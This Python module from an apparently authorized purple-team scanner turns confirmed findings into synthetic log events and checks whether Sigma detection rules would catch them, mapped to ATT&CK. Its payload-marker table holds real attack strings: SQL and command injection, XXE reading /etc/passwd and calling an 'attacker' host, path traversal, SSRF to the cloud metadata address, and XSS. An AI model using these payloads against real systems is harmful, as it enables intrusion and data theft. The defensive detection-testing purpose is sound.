"""
defender.efficacy — the detection-efficacy signal + the assembled purple-team defense report.

This is where the three defensive pieces meet the scan. Given a completed engagement's
oracle-confirmed findings (what the scan actually DID — prove-don't-guess, not asserted), it:

  1. models the telemetry each confirmed action emits and runs it through the operator's
     detection ruleset (``gap_report``) — flagging techniques the ruleset MISSES and synthesizing
     a candidate rule that would catch each miss (rendered as drop-in Sigma YAML);
  2. synthesizes a normalized ``LogEvent`` for each confirmed action and evaluates the operator's
     Sigma ruleset over it — answering the purple-team question "would my detections have caught
     what CRUCIBLE just did?" mapped to MITRE ATT&CK;
  3. (optionally) evaluates the same Sigma ruleset over the operator's INGESTED real logs — "which
     of my detections fire on my own telemetry?".

All strictly DEFENSIVE: it improves the owner's detection coverage. It never evades a detector and
never suppresses a signal. Deterministic and pure: same findings + same rules -> same report. The
scan's oracle verdicts are untouched — this reasons OVER them, it never changes one.
"""

from __future__ import annotations

from dataclasses import dataclass, field

from .gap_report import DetectionGap, detection_gaps
from .logsource import LogEvent
from .models import ActionDescriptor, ActionKind, DetectionRule
from .rules import DetectionRuleset
from .sigma import SigmaEvalResult, SigmaRule, evaluate_events

# ---------------------------------------------------------------------------
# bug-class -> ActionKind / ATT&CK / representative payload
# ---------------------------------------------------------------------------

# The injection family the telemetry model treats as a WAF-visible payload probe.
_INJECTION_CLASSES = frozenset({
    "sqli", "boolean_sqli", "error_based_sqli", "time_based_sqli", "time_based",
    "nosqli", "command_injection", "time_based_command_injection", "rce",
    "ssti", "el_injection", "ldap_injection", "xpath_injection",
    "xxe", "blind_xxe", "deserialization", "lfi", "path_traversal", "ssrf",
})
_XSS_CLASSES = frozenset({"xss", "reflected_xss", "dom_xss", "stored_xss"})
_AUTH_CLASSES = frozenset({"auth_bypass", "idor", "bola", "bfla"})


def _action_kind_for(bug_class: str) -> ActionKind:
    bc = (bug_class or "").lower()
    if bc in _INJECTION_CLASSES or bc in _XSS_CLASSES:
        return ActionKind.INJECTION_PROBE
    if bc in _AUTH_CLASSES:
        return ActionKind.LOGIN_ATTEMPT
    return ActionKind.HTTP_REQUEST


# bug-class -> MITRE ATT&CK technique. Everything here was confirmed via a public-facing web
# request, so T1190 (Exploit Public-Facing Application) is the honest umbrella for the injection
# family; the few classes with a more specific technique get it. Unmapped -> T1190 (documented
# default, not a silent guess). A defensive mapping: it tells the blue team which ATT&CK cell the
# confirmed action lives in so they can check their coverage there.
_ATTACK_BY_CLASS = {
    **{c: "T1190" for c in _INJECTION_CLASSES},
    **{c: "T1059.007" for c in _XSS_CLASSES},   # Command & Scripting Interpreter: JavaScript
    "auth_bypass": "T1078",                      # Valid Accounts
    "idor": "T1190", "bola": "T1190", "bfla": "T1190",
    "exposure": "T1592",                         # Gather Victim Host Information (exposed data)
    "sensitive_exposure": "T1552",               # Unsecured Credentials
}
_ATTACK_DEFAULT = "T1190"


def attack_technique_for(bug_class: str) -> str:
    return _ATTACK_BY_CLASS.get((bug_class or "").lower(), _ATTACK_DEFAULT)


# A representative payload marker for each class — the SHAPE of the attack the confirmed finding
# represents. Modelled telemetry (exactly as DEL's telemetry.model_telemetry already synthesizes a
# marker), so a WAF/proxy Sigma rule keyed on the attack pattern can be exercised. The FINDING is
# real (oracle-confirmed); the marker is a faithful class representative, never a fabricated fact.
_PAYLOAD_MARKER = {
    "sqli": "' OR 1=1 -- ", "boolean_sqli": "' OR 1=1 -- ", "error_based_sqli": "' OR 1=1 -- ",
    "time_based_sqli": "' OR SLEEP(5) -- ", "time_based": "' OR SLEEP(5) -- ",
    "nosqli": "' || '1'=='1", "command_injection": "; id", "rce": "; id",
    "time_based_command_injection": "; sleep 5", "ssti": "{{7*7}}", "el_injection": "${7*7}",
    "ldap_injection": "*)(uid=*", "xpath_injection": "' or '1'='1",
    "xxe": "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
    "blind_xxe": "<!ENTITY % xxe SYSTEM 'http://attacker/'>",
    "deserialization": "rO0ABXNy", "lfi": "../../../../etc/passwd",
    "path_traversal": "../../../../etc/passwd", "ssrf": "http://169.254.169.254/latest/meta-data/",
    "xss": "<script>alert(1)</script>", "reflected_xss": "<script>alert(1)</script>",
    "dom_xss": "<img src=x onerror=alert(1)>", "stored_xss": "<script>alert(1)</script>",
}


# ---------------------------------------------------------------------------
# derive what the scan DID
# ---------------------------------------------------------------------------


def scan_action_descriptors(report: object) -> list[ActionDescriptor]:
    """Turn a scan report's CONFIRMED findings into DEL ``ActionDescriptor``s — one per finding,
    the action whose telemetry the scan actually produced (prove-don't-guess: derived from an
    oracle-confirmed finding, not asserted). Keys off ``bug_class``. Best-effort and total: a
    malformed finding is skipped. Deterministic (input order preserved)."""
    descriptors: list[ActionDescriptor] = []
    for f in getattr(report, "active_findings", []) or []:
        try:
            bc = str(getattr(f, "bug_class", "") or "generic")
            surface = str(getattr(f, "endpoint", "") or getattr(f, "insertion_point", "") or bc)
            kind = _action_kind_for(bc)
            attrs: dict[str, str] = {"bug_class": bc}
            if kind is ActionKind.INJECTION_PROBE:
                attrs["inj_class"] = bc
                attrs["payload_marker"] = _PAYLOAD_MARKER.get(bc, bc)
            descriptors.append(ActionDescriptor(kind=kind, target_surface=surface, attributes=attrs))
        except Exception:
            continue
    return descriptors


def scan_action_events(report: object) -> list[LogEvent]:
    """Synthesize a normalized web-request ``LogEvent`` per confirmed finding — the access/proxy
    telemetry the confirmed action would leave. A Sigma rule keyed on the attack pattern in
    ``cs_uri_query`` (or the class in ``bug_class``) can then be evaluated against it. The event
    field set is documented and stable: ``cs_method``, ``cs_uri_stem``, ``cs_uri_query``,
    ``sc_status``, ``c_useragent``, ``bug_class``, ``attack_technique``. Deterministic; total."""
    events: list[LogEvent] = []
    for f in getattr(report, "active_findings", []) or []:
        try:
            bc = str(getattr(f, "bug_class", "") or "generic")
            endpoint = str(getattr(f, "endpoint", "") or "")
            stem = endpoint.split("?", 1)[0] if endpoint else str(getattr(f, "insertion_point", "") or "/")
            marker = _PAYLOAD_MARKER.get(bc, "")
            fields: dict[str, str | int] = {
                "cs_method": "GET",
                "cs_uri_stem": stem,
                "cs_uri_query": marker or str(getattr(f, "param", "") or ""),
                "sc_status": 200,
                "c_useragent": "OBSIDIAN/1.0 (authorized owner-test)",
                "bug_class": bc,
                "attack_technique": attack_technique_for(bc),
            }
            raw = f"GET {stem}?{fields['cs_uri_query']} 200 crucible-action bug={bc}"
            events.append(LogEvent(channel="webproxy", source_format="scan_action",
                                   fields=fields, raw=raw))
        except Exception:
            continue
    return events


# ---------------------------------------------------------------------------
# candidate rule -> Sigma YAML
# ---------------------------------------------------------------------------

_OP_TO_SIGMA = {"eq": "", "icontains": "|contains", "contains": "|contains"}


def detection_rule_to_sigma(rule: DetectionRule) -> str:
    """Render a synthesized ``DetectionRule`` (from ``gap_report``) as drop-in Sigma YAML the
    operator can add to their SIEM. Only the string operators map cleanly to Sigma's selection
    grammar (eq/contains); a numeric-threshold rule (gte/lte — a rate/count detection) is emitted
    as a commented note, since a stateless Sigma selection cannot express a windowed count. Pure
    string assembly (no yaml.dump dependency on ordering) — deterministic."""
    lines = [
        f"title: {_yaml_scalar(rule.title)}",
        f"id: {_yaml_scalar(rule.id)}",
        "status: experimental",
        f"description: {_yaml_scalar(rule.description or 'Auto-synthesized by CRUCIBLE to close a detection gap.')}",
        "logsource:",
        f"  category: {_yaml_scalar(rule.channel)}",
        "detection:",
    ]
    numeric = [c for c in rule.conditions if c.op in ("gte", "lte")]
    string_conds = [c for c in rule.conditions if c.op in _OP_TO_SIGMA]
    if string_conds:
        lines.append("  selection:")
        for c in string_conds:
            lines.append(f"    {c.field}{_OP_TO_SIGMA[c.op]}: {_yaml_scalar(c.value)}")
        lines.append("  condition: selection")
    else:
        lines.append("  # NOTE: this gap is a rate/count detection (threshold on a numeric field);")
        for c in numeric:
            lines.append(f"  #   {c.field} {c.op} {c.value}  — express as a windowed count in your SIEM")
        lines.append("  condition: selection  # requires a count()/aggregation your backend supplies")
        lines.append("  selection: {}")
    lines.append(f"level: {rule.severity if rule.severity in ('low','medium','high','critical') else 'medium'}")
    return "\n".join(lines)


def _yaml_scalar(value: object) -> str:
    if isinstance(value, bool):
        return "true" if value else "false"
    if isinstance(value, (int, float)):
        return str(value)
    s = str(value)
    # quote if it could be misread as YAML (leading special char, contains a colon/quote)
    if s == "" or s[0] in "!&*?|>%@`\"'#[]{},:-" or ":" in s or "'" in s or '"' in s:
        return '"' + s.replace("\\", "\\\\").replace('"', '\\"') + '"'
    return s


# ---------------------------------------------------------------------------
# detection efficacy
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class FindingDetection:
    """Whether the operator's Sigma ruleset would catch one confirmed action, and by which rules."""

    bug_class: str
    surface: str
    attack_technique: str
    detected: bool
    detected_by: tuple[str, ...] = ()


@dataclass
class DetectionEfficacy:
    """The purple-team efficacy signal: of the actions the scan confirmed, how many the operator's
    Sigma ruleset would detect, broken out per finding and per ATT&CK technique."""

    per_finding: list[FindingDetection] = field(default_factory=list)
    rules_evaluated: int = 0

    @property
    def total(self) -> int:
        return len(self.per_finding)

    @property
    def detected_count(self) -> int:
        return sum(1 for d in self.per_finding if d.detected)

    @property
    def efficacy(self) -> float:
        return round(self.detected_count / self.total, 6) if self.total else 0.0

    @property
    def techniques_covered(self) -> list[str]:
        return sorted({d.attack_technique for d in self.per_finding if d.detected})

    @property
    def techniques_missed(self) -> list[str]:
        covered = set(self.techniques_covered)
        return sorted({d.attack_technique for d in self.per_finding
                       if not d.detected and d.attack_technique not in covered})

    def summary(self) -> str:
        return (f"detection efficacy {self.efficacy:.2f}: {self.detected_count}/{self.total} "
                f"confirmed action(s) would be caught by {self.rules_evaluated} Sigma rule(s); "
                f"ATT&CK covered {self.techniques_covered or 'none'}, "
                f"missed {self.techniques_missed or 'none'}")


def detection_efficacy(report: object, rules: list[SigmaRule]) -> DetectionEfficacy:
    """For each confirmed finding, synthesize its action event and evaluate ``rules`` over JUST
    that event: the finding is 'detected' iff at least one Sigma rule fires on it. Records the
    firing rule ids and the finding's ATT&CK technique. FAIL-CLOSED via the Sigma runtime — an
    unsupported rule never manufactures a detection. Deterministic and pure."""
    rules = list(rules or [])
    per: list[FindingDetection] = []
    for f in getattr(report, "active_findings", []) or []:
        bc = str(getattr(f, "bug_class", "") or "generic")
        surface = str(getattr(f, "endpoint", "") or getattr(f, "insertion_point", "") or bc)
        events = scan_action_events_for(f)
        fired: list[str] = []
        if events:
            res = evaluate_events(rules, events)
            fired = res.matched_rule_ids
        per.append(FindingDetection(
            bug_class=bc, surface=surface, attack_technique=attack_technique_for(bc),
            detected=bool(fired), detected_by=tuple(fired)))
    return DetectionEfficacy(per_finding=per, rules_evaluated=len(rules))


def scan_action_events_for(finding: object) -> list[LogEvent]:
    """The single synthesized action event for one finding (a one-element wrapper reusing the
    report-level synthesizer's field logic)."""
    class _Wrap:
        active_findings = [finding]
    return scan_action_events(_Wrap())


# ---------------------------------------------------------------------------
# assembled defense report
# ---------------------------------------------------------------------------


@dataclass
class DefenseReport:
    """The purple-team deliverable of an engagement (opt-in). Additive and read-only over the
    authoritative scan: it never changes a finding or an oracle verdict.

      * ``gaps``            — per confirmed action, whether the operator's DETECTION RULESET catches
                              it and (if not) a synthesized candidate rule that would;
      * ``candidate_sigma`` — those candidate rules rendered as drop-in Sigma YAML;
      * ``efficacy``        — of the confirmed actions, how many the operator's SIGMA ruleset would
                              catch, mapped to ATT&CK (None if no Sigma rules supplied);
      * ``ingested``        — Sigma evaluated over the operator's OWN ingested logs (None if none).
    """

    target: str = ""
    gaps: list[DetectionGap] = field(default_factory=list)
    candidate_sigma: list[str] = field(default_factory=list)
    efficacy: "DetectionEfficacy | None" = None
    ingested: "SigmaEvalResult | None" = None
    ingested_events: int = 0

    @property
    def uncovered(self) -> list[DetectionGap]:
        return [g for g in self.gaps if not g.covered]

    def summary(self) -> str:
        parts = [f"defense report for {self.target or '(target)'}: {len(self.gaps)} action(s) modelled, "
                 f"{len(self.uncovered)} detection gap(s), {len(self.candidate_sigma)} candidate rule(s)"]
        if self.efficacy is not None:
            parts.append(self.efficacy.summary())
        if self.ingested is not None:
            parts.append("ingested logs: " + self.ingested.summary())
        return " | ".join(parts)

    def to_dict(self) -> dict:
        return {
            "target": self.target,
            "actions_modelled": len(self.gaps),
            "detection_gaps": len(self.uncovered),
            "candidate_sigma": list(self.candidate_sigma),
            "gaps": [{"label": g.label, "covered": g.covered, "covered_by": list(g.covered_by),
                      "candidate_rule_id": (g.candidate_rule.id if g.candidate_rule else None),
                      "note": g.note} for g in self.gaps],
            "efficacy": (None if self.efficacy is None else {
                "efficacy": self.efficacy.efficacy,
                "detected": self.efficacy.detected_count,
                "total": self.efficacy.total,
                "rules_evaluated": self.efficacy.rules_evaluated,
                "techniques_covered": self.efficacy.techniques_covered,
                "techniques_missed": self.efficacy.techniques_missed,
                "per_finding": [{"bug_class": d.bug_class, "surface": d.surface,
                                 "attack_technique": d.attack_technique, "detected": d.detected,
                                 "detected_by": list(d.detected_by)}
                                for d in self.efficacy.per_finding],
            }),
            "ingested": (None if self.ingested is None else {
                "events": self.ingested_events,
                "rules_evaluated": self.ingested.rules_evaluated,
                "rules_unsupported": self.ingested.rules_unsupported,
                "matched_rule_ids": self.ingested.matched_rule_ids,
                "techniques_detected": self.ingested.techniques_detected,
            }),
        }


def build_defense_report(
    report: object,
    *,
    ruleset: DetectionRuleset | None = None,
    sigma_rules: list[SigmaRule] | None = None,
    ingested_events: list[LogEvent] | None = None,
) -> DefenseReport:
    """Assemble the purple-team :class:`DefenseReport` from a completed scan report and the
    operator's optional detection ruleset / Sigma rules / ingested logs. Pure reasoning over the
    confirmed findings — sends no traffic, changes no verdict. All inputs are optional; with none
    supplied it still produces the detection-gap analysis + candidate Sigma rules from the DEL's
    built-in ruleset. Deterministic and best-effort (a malformed input degrades to a partial
    report, never a crash)."""
    target = str(getattr(report, "target", "") or "")
    descriptors = scan_action_descriptors(report)
    try:
        gaps = detection_gaps(descriptors, ruleset=ruleset)
    except Exception:
        gaps = []
    candidate_sigma: list[str] = []
    for g in gaps:
        if g.candidate_rule is not None:
            try:
                candidate_sigma.append(detection_rule_to_sigma(g.candidate_rule))
            except Exception:
                continue

    efficacy = None
    ingested = None
    n_ingested = 0
    if sigma_rules:
        try:
            efficacy = detection_efficacy(report, sigma_rules)
        except Exception:
            efficacy = None
        if ingested_events:
            try:
                n_ingested = len(ingested_events)
                ingested = evaluate_events(sigma_rules, list(ingested_events))
            except Exception:
                ingested = None
                n_ingested = 0

    return DefenseReport(target=target, gaps=gaps, candidate_sigma=candidate_sigma,
                         efficacy=efficacy, ingested=ingested, ingested_events=n_ingested)
